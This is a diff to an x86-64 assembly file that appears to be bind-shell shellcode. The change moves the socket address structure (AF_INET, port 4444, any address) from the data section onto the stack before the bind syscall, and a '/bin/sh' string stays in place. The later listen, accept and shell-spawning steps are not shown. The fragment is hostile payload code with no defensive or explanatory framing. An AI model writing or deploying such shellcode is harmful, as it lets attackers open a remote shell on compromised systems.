@@ -1,10 +1,6 @@
 BITS 64
 
 section .data
-sin_family dw 2
-sin_port dw 0x5c11
-sin_addr dd 0
-sin_zero dq 0
 binsh db '/bin/sh',0
 
 section .text
@@ -20,9 +16,16 @@ syscall
 
 mov r12, rax
 
+sub rsp, 16
+
+mov word [rsp], 2
+mov word [rsp+2], 0x5c11
+mov dword [rsp+4], 0
+mov qword [rsp+8], 0
+
 mov rax, 0x31
 mov rdi, r12
-mov rsi, sin_family
+mov rsi, rsp
 mov rdx, 16
 syscall
 
